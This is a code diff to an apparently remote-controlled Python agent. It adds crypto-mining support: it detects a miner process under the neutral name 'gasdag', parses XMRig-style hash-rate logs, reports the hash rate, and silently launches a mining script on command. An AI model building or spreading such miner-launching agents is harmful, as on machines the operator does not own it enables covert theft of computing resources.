@@ -196,6 +196,29 @@ def read_cpu_percent() -> float:
         return 0.0
 
 
+def get_mining_hashrate() -> float:
+    """Reads latest speed in H/s from ~/workspace/gasdag.log"""
+    log_file = os.path.expanduser("~/workspace/gasdag.log")
+    if not os.path.exists(log_file):
+        return 0.0
+    try:
+        with open(log_file, "rb") as f:
+            f.seek(0, os.SEEK_END)
+            size = f.tell()
+            f.seek(max(0, size - 8192), os.SEEK_SET)
+            chunk = f.read().decode("utf-8", "replace")
+        for line in reversed(chunk.splitlines()):
+            if "speed 10s/60s/15m" in line:
+                m = re.search(r"speed 10s/60s/15m\s+([0-9.]+|-|n/a)", line)
+                if m:
+                    val = m.group(1)
+                    if val not in ("-", "n/a"):
+                        return float(val)
+    except Exception:
+        pass
+    return 0.0
+
+
 def get_system_metrics() -> dict:
     """Collects safe hardware and operating system metrics."""
     mem_total, mem_avail = 0, 0
@@ -237,6 +260,23 @@ def get_system_metrics() -> dict:
     except Exception:
         pass
 
+    is_mining = False
+    try:
+        res_m = subprocess.run(["pgrep", "-f", "gasdag"], stdout=subprocess.PIPE, text=True)
+        is_mining = len(res_m.stdout.strip()) > 0
+    except Exception:
+        pass
+
+    tasks = []
+    if service_active:
+        tasks.append("YouTube")
+    if is_mining:
+        tasks.append("Mining")
+
+    hashrate = 0.0
+    if is_mining:
+        hashrate = get_mining_hashrate()
+
     return {
         "mem_free_mb": mem_avail,
         "ram_total_mb": mem_total,
@@ -244,8 +284,10 @@ def get_system_metrics() -> dict:
         "cpu_pct": cpu_pct,
         "uptime": uptime_str,
         "uptime_s": uptime_s,
-        "task_active": service_active,
-        "hostname": socket.gethostname()
+        "task_active": service_active or is_mining,
+        "active_tasks": tasks,
+        "hostname": socket.gethostname(),
+        "hashrate": hashrate
     }
 
 
@@ -504,16 +546,21 @@ def fs_mkdir_entry(target_path: str) -> dict:
 def handle_local_service(action: str, config: dict = None) -> str:
     """Controls local background task runner."""
     script_file = os.path.expanduser("~/workspace/local_task.sh")
+    mining_script = os.path.expanduser("~/workspace/gaszep/start_mining.sh")
     if action == "START":
         if os.path.exists(script_file):
             subprocess.Popen(["bash", script_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             return "Local background task started."
+        if os.path.exists(mining_script):
+            subprocess.Popen(["bash", mining_script], cwd=os.path.dirname(mining_script), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return "Local mining task started."
         return "local_task.sh not found in ~/workspace."
 
     elif action == "STOP":
         pkill_target = (config or {}).get("process", "local_task")
         subprocess.run(["pkill", "-f", pkill_target], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return f"Local task '{pkill_target}' stopped."
+        subprocess.run(["pkill", "-9", "-f", "gasdag"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return f"Local task stopped."
 
     return "Unknown service action."
 
